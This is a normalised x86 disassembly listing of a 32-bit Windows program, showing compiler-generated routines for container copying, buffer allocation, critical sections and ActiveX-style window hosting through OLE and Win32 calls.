mov edi ecx
xor ebx ebx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x4 ] 0x1
cmp esi ebx
je r-xdata
add esi 0xc0
mov [ ebp - 0x4 ] bl
mov [ ebp + 0xc ] esi
add edi 0xc0
jmp r-xdata
push esi
call sub_411f30
cmp edi [ ebp + 0x8 ]
je r-xdata
sub_412c7f
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0xc ]
cmp esi edi
je r-xdata
xor ebx ebx
push ebx
push ebx
call sub_442eab
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea esp [ esp ]
call sub_402480
add esi 0xc0
cmp esi edi
jne r-xdata
sub_412cc0
push ebp
mov ebp esp
push 0xffffffff
push sub_4599dd
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi edx
xor ebx ebx
mov edi ecx
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x4 ] 0x1
mov edi edi
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov [ ebp - 0x4 ] 0x2
cmp esi ebx
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_43f96b
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x2c ]
push ecx
call sub_43f960
add esp 0x4
push esi
mov ecx edi
mov [ ebp - 0x4 ] 0x1
call sub_4130e0
add esi 0x1c
mov [ ebp - 0x34 ] esi
add edi 0x1c
jmp r-xdata
push 0xffffffff
push ebx
lea eax [ ebp - 0x30 ]
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
push eax
mov ecx esi
mov [ esi + 0x4 ] bl
call sub_429ea0
cmp edi [ ebp + 0x8 ]
je r-xdata
sub_412d4f
mov esi [ ebp - 0x38 ]
mov edi [ ebp - 0x34 ]
cmp esi edi
je r-xdata
xor ebx ebx
push ebx
push ebx
call sub_442eab
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
lea esp [ esp ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_43f96b
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x2c ]
push ecx
call sub_43f960
add esp 0x4
call sub_412bc0
add esi 0x1c
cmp esi edi
jne r-xdata
sub_412db0
push ecx
mov eax [ rw-data ]
xor eax esp
mov [ esp ] eax
mov eax [ esp + 0xc ]
cmp [ esp + 0x8 ] ecx
je r-xdata
mov ecx [ esp ]
xor ecx esp
call sub_43f96b
pop ecx
retn
push ebx
push ebp
push esi
push edi
lea esp [ esp ]
cmp ecx [ esp + 0x18 ]
jne r-xdata
mov ebp [ ecx + 0x4 ]
mov edx [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
mov edi [ eax + 0xc ]
mov ebx [ eax + 0x10 ]
mov [ eax + 0x4 ] ebp
mov ebp [ ecx + 0x8 ]
mov [ eax + 0x8 ] ebp
mov ebp [ ecx + 0xc ]
mov [ eax + 0xc ] ebp
mov ebp [ ecx + 0x10 ]
mov [ eax + 0x10 ] ebp
mov [ ecx + 0x4 ] edx
mov [ ecx + 0x8 ] esi
mov esi [ ecx + 0x14 ]
mov [ ecx + 0xc ] edi
mov [ ecx + 0x10 ] ebx
mov edx [ eax + 0x14 ]
mov [ eax + 0x14 ] esi
mov esi [ ecx + 0x18 ]
mov [ ecx + 0x14 ] edx
mov edx [ eax + 0x18 ]
mov [ eax + 0x18 ] esi
mov [ ecx + 0x18 ] edx
sub ecx 0x1c
sub eax 0x1c
cmp eax ecx
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
sub_412e40
push ecx
push ebp
push esi
mov esi eax
push edi
mov edi ecx
sub ecx ebx
mov eax 0x2aaaaaab
imul ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
lea eax [ eax + eax * 2 ]
shl eax 0x6
mov ebp esi
sub ebp eax
cmp ebx edi
je r-xdata
pop edi
pop esi
mov eax ebp
pop ebp
pop ecx
retn
mov eax esi
sub eax edi
mov [ esp + 0xc ] eax
jmp r-xdata
sub edi 0xc0
lea esi [ eax + edi ]
call sub_402610
cmp edi ebx
jne r-xdata
mov eax [ esp + 0xc ]
sub_412e90
push 0xffffffff
push sub_459e35
mov eax [ fs : 0x0 ]
push eax
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ esp + 0x1c ]
mov [ esp + 0x14 ] 0x0
test ecx ecx
je r-xdata
mov ecx [ esp + 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
add esp 0xc
retn
cmp [ eax + 0x18 ] 0x10
jb r-xdata
lea esi [ eax + 0x4 ]
mov esi [ eax + 0x4 ]
jmp r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax edi
push eax
push esi
call sub_42a180
mov eax esi
mov [ ecx + 0x18 ] 0xf
mov [ ecx + 0x14 ] 0x0
mov [ ecx + 0x4 ] 0x0
lea edi [ eax + 0x1 ]
sub_412f10
push ecx
push ebx
push ebp
mov ebp [ esp + 0x10 ]
push esi
push edi
mov edi ecx
mov esi eax
cmp ebp edi
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
sub edi 0xd8
sub esi 0xd8
call sub_402610
lea eax [ esi + 0xc0 ]
lea ebx [ edi + 0xc0 ]
push eax
call sub_40fc70
cmp edi ebp
jne r-xdata
mov eax esi
sub_412f50
push ebx
push ebp
mov ebp [ esp + 0xc ]
push esi
mov esi ecx
mov ebx eax
cmp ebp esi
je r-xdata
pop esi
pop ebp
pop ebx
retn
push edi
lea edx [ esi + 0x4 ]
mov edx [ esi + 0x4 ]
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edi
push eax
push edx
mov ecx ebx
call sub_42a180
cmp esi ebp
jne r-xdata
mov eax edx
lea edi [ eax + 0x1 ]
lea esp [ esp ]
sub esi 0x1c
sub ebx 0x1c
cmp [ esi + 0x18 ] 0x10
jb r-xdata
mov eax ebx
pop edi
sub_412fa0
push ebp
mov ebp esp
push 0xffffffff
push sub_45aa6d
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0xc ]
mov edi ecx
xor ebx ebx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0x1
cmp esi ebx
je r-xdata
add esi 0xd8
mov [ ebp - 0x4 ] bl
mov [ ebp + 0xc ] esi
add edi 0xd8
jmp r-xdata
push esi
call sub_411f30
lea eax [ esi + 0xc0 ]
lea ecx [ edi + 0xc0 ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_40fb60
cmp edi [ ebp + 0x8 ]
je r-xdata
sub_413018
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0xc ]
cmp esi edi
je r-xdata
xor ebx ebx
push ebx
push ebx
call sub_442eab
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_412bf0
add esi 0xd8
cmp esi edi
jne r-xdata
sub_413050
push ebp
mov ebp esp
push 0xffffffff
push sub_45a250
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi [ ebp + 0x8 ]
mov ebx ecx
mov esi edx
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
lea esp [ esp ]
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
mov ecx edi
call sub_412e90
add edi 0x1c
add esp 0x4
mov [ ebp + 0x8 ] edi
add esi 0x1c
jmp r-xdata
cmp esi ebx
je r-xdata
sub_4130aa
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x0
push 0x0
call sub_442eab
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_412bc0
add esi 0x1c
cmp esi edi
jne r-xdata
sub_4130e0
push ecx
mov eax [ rw-data ]
xor eax esp
mov [ esp ] eax
mov eax [ esp + 0x8 ]
cmp eax ecx
je r-xdata
mov ecx [ esp ]
xor ecx esp
call sub_43f96b
pop ecx
retn 0x4
mov edx [ eax + 0x4 ]
push ebx
mov ebx [ eax + 0x10 ]
push ebp
mov ebp [ ecx + 0x4 ]
push esi
mov esi [ eax + 0x8 ]
push edi
mov edi [ eax + 0xc ]
mov [ eax + 0x4 ] ebp
mov ebp [ ecx + 0x8 ]
mov [ eax + 0x8 ] ebp
mov ebp [ ecx + 0xc ]
mov [ eax + 0xc ] ebp
mov ebp [ ecx + 0x10 ]
mov [ eax + 0x10 ] ebp
mov [ ecx + 0x4 ] edx
mov [ ecx + 0x8 ] esi
mov esi [ ecx + 0x14 ]
mov [ ecx + 0xc ] edi
mov [ ecx + 0x10 ] ebx
mov edx [ eax + 0x14 ]
mov [ eax + 0x14 ] esi
mov esi [ ecx + 0x18 ]
mov [ ecx + 0x14 ] edx
mov edx [ eax + 0x18 ]
pop edi
mov [ eax + 0x18 ] esi
pop esi
pop ebp
mov [ ecx + 0x18 ] edx
pop ebx
sub_413160
push esi
mov esi eax
push edi
cmp esi 0x4
jb r-xdata
test esi esi
je r-xdata
lea esp [ esp ]
pop edi
xor eax eax
pop esi
retn
movzx eax [ edx ]
movzx edi [ ecx ]
sub eax edi
jne r-xdata
sub esi 0x4
add ecx 0x4
add edx 0x4
cmp esi 0x4
jae r-xdata
sar eax 0x1f
pop edi
or eax 0x1
pop esi
retn
cmp esi 0x1
jbe r-xdata
mov eax [ edx ]
cmp eax [ ecx ]
jne r-xdata
movzx eax [ edx + 0x1 ]
movzx edi [ ecx + 0x1 ]
sub eax edi
jne r-xdata
cmp esi 0x2
jbe r-xdata
movzx eax [ edx + 0x2 ]
movzx edi [ ecx + 0x2 ]
sub eax edi
jne r-xdata
cmp esi 0x3
jbe r-xdata
movzx eax [ edx + 0x3 ]
movzx ecx [ ecx + 0x3 ]
sub eax ecx
sub_4131e0
mov ecx [ esi ]
test ecx ecx
jne r-xdata
mov eax [ esi + 0x8 ]
push ebx
mov ebx [ esi + 0x4 ]
sub ebx ecx
lea edx [ ebx + edi ]
cmp edx eax
jbe r-xdata
mov eax edi
shr eax 0xa
inc eax
shl eax 0xa
push eax
push 0x40
mov [ esi + 0x8 ] eax
call [ GlobalAlloc@IAT ]
mov [ esi ] eax
mov [ esi + 0x4 ] eax
jmp r-xdata
pop ebx
mov edx edi
shr edx 0xa
inc edx
shl edx 0xa
add eax edx
push 0x0
push eax
push ecx
mov [ esi + 0x8 ] eax
call [ GlobalReAlloc@IAT ]
mov [ esi ] eax
add eax ebx
mov [ esi + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov ecx [ esi + 0x8 ]
sub ecx eax
add ecx [ esi ]
cmp ecx edi
jb r-xdata
add [ esi + 0x4 ] edi
retn 0x4
mov edx [ esp + 0x4 ]
push edi
push edx
push eax
call sub_443790
add esp 0xc
sub_413260
sub esp 0x18
or eax 0x40
push ebx
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x20 ]
push ebp
push esi
mov [ esp + 0x14 ] eax
mov esi ecx
xor edx edx
xor eax eax
xor ecx ecx
push edi
mov [ esp + 0x1e ] dx
mov [ esp + 0x20 ] ax
mov edx 0x62
mov [ esp + 0x1c ] cx
lea eax [ esp + 0x14 ]
mov ecx 0xbb
push eax
lea edi [ edx - 0x50 ]
mov [ esp + 0x14 ] 0x8
mov [ esp + 0x26 ] cx
mov [ esp + 0x28 ] dx
call sub_4131e0
mov eax [ esp + 0x34 ]
mov ebp [ lstrlenW@IAT ]
test eax eax
jne r-xdata
test eax 0xffff0000
jne r-xdata
lea ecx [ esp + 0x2c ]
mov [ esp + 0x2c ] 0x0
push ecx
mov edi 0x2
jmp r-xdata
push eax
mov ebx eax
call ebp
inc eax
lea edi [ eax + eax ]
push ebx
mov [ esp + 0x2e ] ax
mov edx 0xffff
lea eax [ esp + 0x2c ]
mov [ esp + 0x2c ] dx
push eax
mov edi 0x4
jmp r-xdata
call sub_4131e0
mov eax [ esp + 0x30 ]
test eax eax
jne r-xdata
test eax 0xffff0000
jne r-xdata
lea ecx [ esp + 0x2c ]
mov [ esp + 0x2c ] eax
push ecx
lea edi [ eax + 0x2 ]
jmp r-xdata
push eax
mov ebx eax
call ebp
inc eax
lea edi [ eax + eax ]
push ebx
mov [ esp + 0x2e ] ax
mov edx 0xffff
lea eax [ esp + 0x2c ]
mov [ esp + 0x2c ] dx
push eax
mov edi 0x4
jmp r-xdata
call sub_4131e0
lea ecx [ esp + 0x2c ]
push ecx
mov edi 0x2
mov [ esp + 0x30 ] 0x0
call sub_4131e0
lea edx [ esp + 0x10 ]
push edx
call sub_4131e0
push r--data
call ebp
inc eax
lea edi [ eax + eax ]
push r--data
call sub_4131e0
pop edi
pop esi
pop ebp
pop ebx
add esp 0x18
retn 0xc
sub_413390
push ebx
push esi
push edi
call sub_416140
mov esi eax
test esi esi
jne r-xdata
mov eax [ esi ]
mov ebx [ esp + 0x10 ]
mov edx [ eax + 0x8 ]
push esi
mov ecx esi
mov [ esi + 0x4 ] ebx
call edx
lea edi [ esi + 0x8 ]
call sub_416300
mov esi [ esi + 0x14 ]
push esi
push 0x4
push ebx
call [ SetWindowLongW@IAT ]
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
push eax
push ecx
push edx
push ebx
call esi
pop edi
pop esi
pop ebx
retn 0x10
pop edi
pop esi
pop ebx
retn 0x10
sub_4133f0
push ecx
test esi esi
je r-xdata
push 0x0
push 0x0
push 0x1
push 0xc0000005
call [ RaiseException@IAT ]
int3
test eax eax
je r-xdata
mov [ esi ] eax
call [ GetCurrentThreadId@IAT ]
push rw-data
mov [ esi + 0x4 ] eax
call [ EnterCriticalSection@IAT ]
mov eax [ rw-data ]
mov [ esi + 0x8 ] eax
push rw-data
mov [ rw-data ] esi
call [ LeaveCriticalSection@IAT ]
pop ecx
retn
sub_413440
push ebx
mov ebx [ rw-data ]
push esi
add ebx 0x10
push ebx
call [ EnterCriticalSection@IAT ]
mov eax [ rw-data ]
test eax eax
je r-xdata
mov esi eax
test eax eax
je r-xdata
cmp [ eax + 0x4 ] 0x0
jle r-xdata
push ebx
mov [ rw-data ] 0x0
call [ LeaveCriticalSection@IAT ]
pop esi
pop ebx
retn
mov eax [ eax ]
test eax eax
je r-xdata
mov eax [ eax ]
mov ecx [ eax ]
push ecx
call [ DestroyWindow@IAT ]
mov eax [ rw-data ]
push esi
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
call sub_43f960
add esp 0x4
push eax
call sub_44120e
add esp 0x4
mov [ esi ] 0x0
sub_4134c0
push esi
mov esi [ rw-data ]
push edi
xor edi edi
cmp esi edi
je r-xdata
mov esi [ rw-data ]
cmp esi [ rw-data ]
jae r-xdata
cmp [ esi ] edi
je r-xdata
cmp [ rw-data ] edi
je r-xdata
nop
mov eax [ esi + 0x10 ]
cmp eax edi
je r-xdata
pop edi
pop esi
retn
cmp [ rw-data ] edi
je r-xdata
add esi 0x4
cmp esi [ rw-data ]
jb r-xdata
mov ecx [ eax + 0x20 ]
push edi
call ecx
mov eax [ esi + 0x20 ]
push edi
mov [ esi + 0x10 ] edi
call eax
add esi 0x24
cmp [ esi ] edi
jne r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ rw-data ]
cmp eax edi
je r-xdata
push ebx
mov ebx rw-data
call sub_419d80
mov [ rw-data ] edi
pop ebx
mov eax [ esi ]
cmp eax edi
je r-xdata
push rw-data
call [ DeleteCriticalSection@IAT ]
mov [ rw-data ] edi
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
sub_413560
push esi
call sub_413440
mov esi [ rw-data ]
test esi esi
je r-xdata
pop esi
jmp sub_4134c0
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call sub_44120e
add esp 0x4
mov [ esi ] 0x0
push esi
mov [ esi + 0x8 ] 0x0
call sub_43f960
add esp 0x4
push eax
call sub_44120e
add esp 0x4
mov [ esi + 0x4 ] 0x0
sub_4135c0
push esi
mov esi [ rw-data ]
mov [ rw-data ] 0x0
cmp esi [ rw-data ]
jae r-xdata
xor eax eax
pop esi
retn
lea esp [ esp ]
add esi 0x4
cmp esi [ rw-data ]
jb r-xdata
mov eax [ eax + 0x20 ]
push 0x1
call eax
mov eax [ esi ]
test eax eax
je r-xdata
sub_413600
push ebp
mov ebp esp
push 0xffffffff
push sub_458f70
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
call sub_4135c0
mov edi eax
xor esi esi
cmp edi esi
mov [ ebp - 0x14 ] edi
jl r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call [ GetCurrentThreadId@IAT ]
push 0xc
mov [ rw-data ] eax
mov [ rw-data ] esi
mov [ ebp - 0x4 ] esi
call sub_43fa1d
add esp 0x4
cmp eax esi
je r-xdata
xor eax eax
mov [ rw-data ] eax
jmp r-xdata
mov [ eax ] esi
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] esi
mov [ rw-data ] eax
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
mov [ rw-data ] esi
mov eax edi
mov eax 0x8007000e
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4136c0
push ebp
mov ebp esp
push 0xffffffff
push sub_45a6a0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
sub eax 0x1
mov ebx [ ebp + 0x8 ]
je r-xdata
xor edi edi
push edi
call [ OleInitialize@IAT ]
push ebx
call [ GetWindowTextLengthW@IAT ]
mov esi eax
lea eax [ esi + esi + 0xa ]
cmp eax 0x400
ja r-xdata
sub eax 0x81
je r-xdata
push eax
call sub_441c3d
add esp 0x4
cmp eax edi
je r-xdata
call sub_443650
mov eax esp
cmp eax edi
je r-xdata
push 0xffffffeb
push ebx
call [ GetWindowLongW@IAT ]
test eax eax
je r-xdata
sub eax 0x18e
jne r-xdata
mov [ ebp - 0x24 ] eax
mov [ eax ] 0xdddd
add eax 0x8
mov [ ebp - 0x24 ] eax
jmp r-xdata
mov [ eax ] 0xcccc
add eax 0x8
call [ OleUninitialize@IAT ]
jmp r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
push eax
push ecx
push edx
push ebx
call [ DefWindowProcW@IAT ]
cmp [ ebp + 0x10 ] 0x1
jne r-xdata
or eax 0xffffffff
jmp r-xdata
inc esi
push esi
push eax
push ebx
call [ GetWindowTextW@IAT ]
push r--data
push ebx
call [ SetWindowTextW@IAT ]
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x28 ] edi
cmp eax edi
je r-xdata
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
lea esp [ ebp - 0x38 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_43f96b
mov esp ebp
pop ebp
retn 0x10
push edi
push 0x42
call [ GlobalAlloc@IAT ]
mov esi eax
xor eax eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x1
cmp esi eax
je r-xdata
mov eax [ eax ]
cmp eax edi
je r-xdata
mov esi [ GetWindowLongW@IAT ]
push 0xffffffec
push eax
call esi
test eax 0x10000
je r-xdata
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] eax
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x4 ] 0x3
mov ecx [ ebp - 0x14 ]
push ecx
push ebx
call sub_419430
test eax eax
jge r-xdata
cmp edi eax
je r-xdata
movzx edi [ eax ]
push 0xffffffec
push ebx
call esi
or eax 0x10000
push eax
push 0xffffffec
push ebx
call [ SetWindowLongW@IAT ]
jmp r-xdata
mov esi [ ebp - 0x18 ]
mov eax [ esi ]
mov edx [ eax ]
lea ecx [ ebp - 0x28 ]
push ecx
push r--data
push esi
call edx
test eax eax
jge r-xdata
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
push esi
call [ GlobalLock@IAT ]
mov ecx [ ebp + 0x14 ]
mov ecx [ ecx ]
push eax
add ecx 0x2
mov eax edi
mov edx edi
call sub_41a8e0
add esp 0x4
push esi
call [ GlobalUnlock@IAT ]
lea edx [ ebp - 0x14 ]
push edx
push 0x1
push esi
call [ CreateStreamOnHGlobal@IAT ]
xor eax eax
mov ecx [ ebp - 0x28 ]
push ecx
push 0xffffffeb
push ebx
call [ SetWindowLongW@IAT ]
mov [ ebp - 0x4 ] 0x2
mov edx [ esi ]
mov eax [ edx + 0x8 ]
push esi
call eax
lea esi [ ebp - 0x1c ]
call sub_41aed0
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x2
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
push esi
call ecx
lea esi [ ebp - 0x1c ]
call sub_41aed0
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
lea esi [ ebp - 0x1c ]
call sub_41aed0
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
lea esi [ ebp - 0x20 ]
call sub_413980
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
lea esi [ ebp - 0x20 ]
call sub_413980
or eax 0xffffffff
jmp r-xdata
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
lea esi [ ebp - 0x20 ]
call sub_413980
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_4139b0
push 0xffffffff
push sub_45912b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x400
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x3fc ] eax
push ebx
push ebp
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x410 ]
mov [ fs : 0x0 ] eax
mov ebp [ esp + 0x420 ]
mov [ ebp ] 0x0
test esi esi
je r-xdata
xor eax eax
mov eax [ esi ]
mov eax [ eax + 0xc ]
lea ecx [ esp + 0x14 ]
push ecx
push 0x2
lea edx [ esp + 0x24 ]
push edx
push esi
call eax
test eax eax
jl r-xdata
mov ecx [ esp + 0x410 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebp
pop ebx
mov ecx [ esp + 0x3fc ]
xor ecx esp
call sub_43f96b
add esp 0x40c
retn
mov ecx [ esi ]
mov ecx [ ecx + 0xc ]
lea edx [ esp + 0x14 ]
push edx
push 0x4
lea eax [ esp + 0x28 ]
push eax
push esi
call ecx
test eax eax
jl r-xdata
mov edx [ esi ]
mov edx [ edx + 0xc ]
lea eax [ esp + 0x14 ]
push eax
push 0x4
lea ecx [ esp + 0x20 ]
push ecx
push esi
call edx
test eax eax
jl r-xdata
mov eax [ esp + 0x18 ]
test eax eax
jbe r-xdata
mov ax [ esp + 0x1c ]
mov edx 0x37a
cmp ax dx
je r-xdata
jne r-xdata
mov edx [ esi ]
mov edx [ edx + 0xc ]
lea eax [ esp + 0x14 ]
push eax
push 0x4
lea ecx [ esp + 0x18 ]
push ecx
push esi
call edx
test eax eax
jl r-xdata
mov ecx 0x37b
cmp ax cx
je r-xdata
push eax
push 0x0
call [ SysAllocStringLen@IAT ]
mov edi eax
mov [ esp + 0x10 ] edi
test edi edi
jne r-xdata
xor edi edi
mov [ esp + 0x10 ] edi
mov eax [ esp + 0x10 ]
sub eax 0x4
mov [ esp + 0x10 ] eax
je r-xdata
xor ecx ecx
mov edx 0x376
cmp ax dx
sete cl
dec ecx
and ecx 0x80004005
mov eax ecx
jmp r-xdata
push edi
mov [ esp + 0x41c ] 0x0
call [ SysStringLen@IAT ]
test eax eax
jne r-xdata
push 0x8007000e
call sub_427e00
mov eax [ esp + 0x18 ]
lea ecx [ eax + eax + 0x2 ]
push ecx
push 0x0
push edi
call sub_443360
mov ecx [ esp + 0x24 ]
mov edx [ esi ]
add esp 0xc
lea eax [ esp + 0x14 ]
push eax
lea eax [ ecx + ecx ]
mov ecx [ edx + 0xc ]
push eax
push edi
push esi
call ecx
mov ebx eax
test ebx ebx
jge r-xdata
push edi
call [ SysFreeString@IAT ]
mov eax 0x8007000e
jmp r-xdata
cmp eax 0x3e8
jb r-xdata
push 0x0
mov [ ebp ] edi
mov [ esp + 0x41c ] 0xffffffff
call [ SysFreeString@IAT ]
push edi
call [ SysFreeString@IAT ]
mov eax ebx
jmp r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0xc ]
lea edx [ esp + 0x14 ]
push edx
push eax
lea eax [ esp + 0x2c ]
push eax
push esi
call ecx
mov eax [ esp + 0x10 ]
sub eax [ esp + 0x14 ]
mov [ esp + 0x10 ] eax
jne r-xdata
mov eax 0x3e8
sub_413bb0
mov eax [ DefWindowProcW@IAT ]
push edi
xor edi edi
mov [ esi + 0x50 ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] eax
mov [ esi + 0x3c ] edi
mov [ esi + 0x54 ] edi
mov [ esi + 0x60 ] edi
mov [ esi + 0x64 ] edi
mov [ esi + 0x68 ] edi
mov [ esi + 0x6c ] edi
mov [ esi + 0x70 ] edi
mov [ esi + 0x74 ] edi
mov [ esi + 0x78 ] edi
mov [ esi + 0x7c ] edi
mov [ esi + 0xd8 ] edi
mov [ esi + 0xdc ] edi
mov [ esi + 0xe8 ] edi
mov ecx [ esi + 0xc8 ]
and [ esi + 0x98 ] 0xffffffc0
and ecx 0xfffffffb
or ecx 0x3
push 0x8
mov [ esi + 0xc8 ] ecx
mov [ esi + 0xcc ] edi
call [ GetSysColor@IAT ]
mov edx [ esi + 0xc8 ]
and [ esi + 0x98 ] 0xffffffbf
and edx 0xffffffaf
or edx 0x28
mov [ esi + 0xd0 ] eax
mov [ esi + 0xe4 ] edi
mov [ esi + 0x58 ] edi
mov [ esi + 0xc4 ] edi
mov [ esi + 0xd4 ] 0x400
mov [ esi + 0x94 ] 0xcdcdcdcd
mov [ esi + 0xe0 ] 0x4
mov [ esi + 0xc8 ] edx
mov [ esi + 0x5c ] 0x1
mov eax esi
pop edi
retn
sub_413c80
sub esp 0x64
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x60 ] eax
cmp [ esi + 0x70 ] 0x0
mov eax [ esp + 0x68 ]
push ebx
push ebp
push edi
jne r-xdata
test [ esi + 0x98 ] 0x8
je r-xdata
mov ecx [ esi + 0x4 ]
lea eax [ esp + 0x28 ]
push eax
push ecx
call [ BeginPaint@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
mov [ eax ] 0x0
mov eax [ esi + 0x4 ]
lea edx [ esp + 0x28 ]
push edx
push eax
call [ BeginPaint@IAT ]
mov ebp eax
test ebp ebp
je r-xdata
mov ecx [ esp + 0x6c ]
pop edi
pop ebp
pop ebx
xor ecx esp
xor eax eax
call sub_43f96b
add esp 0x64
